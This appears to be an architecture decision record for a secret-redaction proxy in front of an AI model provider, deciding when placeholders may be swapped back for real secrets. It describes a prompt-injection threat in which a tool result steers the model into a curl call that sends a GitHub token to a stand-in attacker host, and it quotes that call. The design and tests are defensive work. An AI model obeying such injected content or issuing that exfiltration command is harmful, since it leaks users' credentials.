# ADR-0017: Rehydration: a policy-gated action with a recorded round trip

**Status:** Proposed (opened 2026-10-13; earliest decision 2026-10-15, 48 h) · **Plan refs:** v2 §2.4, I-05, I-06, T17, C-53 · **Builds on:** ADR-0009, ADR-0014 · **Resolves:** v1's inconsistency between "rehydration toward tools: deny" and "rehydration to the originating client"

## Context

Redaction replaces secrets in outbound requests with stable placeholders
(`[REDACTED:<class>:<tag>]`, ADR-0009). The model then works with placeholders. Rehydration, the
reverse substitution in responses, is needed so that the harness gets real values back. For
example, a file the model edits must keep the real configuration value, not a placeholder.

The plan v2 review found two defects in "rehydrate toward the originating client":

1. **Exfiltration (T17).** An injected tool result can make the model emit a shell or fetch
   call such as `curl https://attacker/?k=[REDACTED:github_token:…]`. Rehydrating it hands the
   attacker the secret.
2. **The re-detection round trip is false.** The next request carries the rehydrated plaintext
   in history, and the plan assumed that redacting it again restores the placeholder exactly. It
   does not always:
   - `url_credentials` redacts only the password, so a bare rehydrated password is not detected
     again;
   - validators with exact lengths and word boundaries miss a secret glued to neighbouring
     characters;
   - the final scan's known-secret list holds only the vault's provider keys.

   The plaintext would then reach the provider (red line 2) **and** change provider-produced
   values (a prefix break).

## Decision

1. **Rehydration is an authorization decision.**
   - A Cedar action `secret.rehydrate` is evaluated per placeholder, with context: block kind
     (text, `tool_use`, thinking), tool name, session and data class.
   - Default policy:
     - **Allow:** text blocks, and `tool_use` inputs of tools declared as local file edits.
     - **Deny:** shell, fetch and network/MCP tools, and any tool the policy does not know.
     - **Thinking and signed blocks are never rehydrated** (ADR-0014 role `signed`).
   - Denied placeholders reach the client unchanged, with an explanation.
   - A per-tool `secret.reveal` grant (ADR-0008, with TTL and scope) can open more.
   - Every rehydration is journaled.
2. **The round trip is recorded, not re-detected.**
   - While streaming, UAOS records for each provider-produced block `digest(value after
     rehydration) → value as the provider produced it`. The record is bounded per Session and
     stored as a chunk.
   - When the client sends that block back as history, UAOS matches it **by value** and
     substitutes the provider's original. JSON formatting and key order are irrelevant, matching
     the provider's own check.
   - **Detectors never run over provider-produced content** (ADR-0014 role `provider_produced`).
     A secret-shaped string the model invented is therefore left exactly as produced.
3. **Rehydrated secrets are known to the final scan.** Every secret of 8 bytes or more that UAOS
   rehydrated in a Session joins that Session's **known-secret matcher**. If any of them appears
   in an outbound request outside a recorded round trip, the request is **blocked** (I-05,
   fail-closed). Examples are a client that edited the block, or a tool that echoed the secret.
4. **Refuse what cannot be proven.** When the round trip cannot be recorded, UAOS does not
   rehydrate:
   - placeholders split across content blocks;
   - a block too large for the bounded record;
   - a data class whose detector covers only part of the secret, such as `url_credentials`.

   The placeholder then reaches the client unchanged, with an explanation.
5. **Streaming.** Rehydration uses a lookahead buffer per content block to catch placeholders
   split across SSE deltas. The buffer is bounded so that it never holds back bytes past the
   client's idle watchdog. SSE `ping` events always pass through immediately (plan v2 §2.5).

## Alternatives rejected

- **Rehydrate everything toward the originating client:** this enables exfiltration (T17).
- **Never rehydrate:** harness edits would write placeholders into the user's files, and silent
  corruption is worse than an explained refusal.
- **Rely on re-detection for the round trip:** provably false for several detectors, as above.

## Consequences

- Some harness actions get placeholders instead of secrets and say so. The user can grant
  `secret.reveal` per tool, deliberately and with a TTL.
- Each Session holds a bounded round-trip record and a known-secret matcher, both encrypted at
  rest as chunks and shredded with the pocket.

## Threat and privacy note

- **T17:** closed for tools the policy does not trust.
- **T2:** rehydrated plaintext can never leave unnoticed.
- **I-06:** provider-produced values are restored exactly.
- **Residual:** a tool trusted with `secret.reveal` can misuse what it receives. The grant names
  that risk.

## Verification (WP3.4)

- **`rehydration-exfil` behavior:** a canary secret in a tool result is rehydrated in text and in
  a file-edit `tool_use`, and stays a placeholder in shell and fetch `tool_use`.
- **Round trip:** across turns the provider sees the exact values it produced, including
  multi-line and double-escaped (`partial_json`) secrets.
- **Blocking:**
  - an edited rehydrated block that carries the secret outside the record is blocked;
  - `url_credentials` and glued placeholders are refused, not rehydrated.
- **Live lane:** zero binding mismatches by the provider's own oracle.
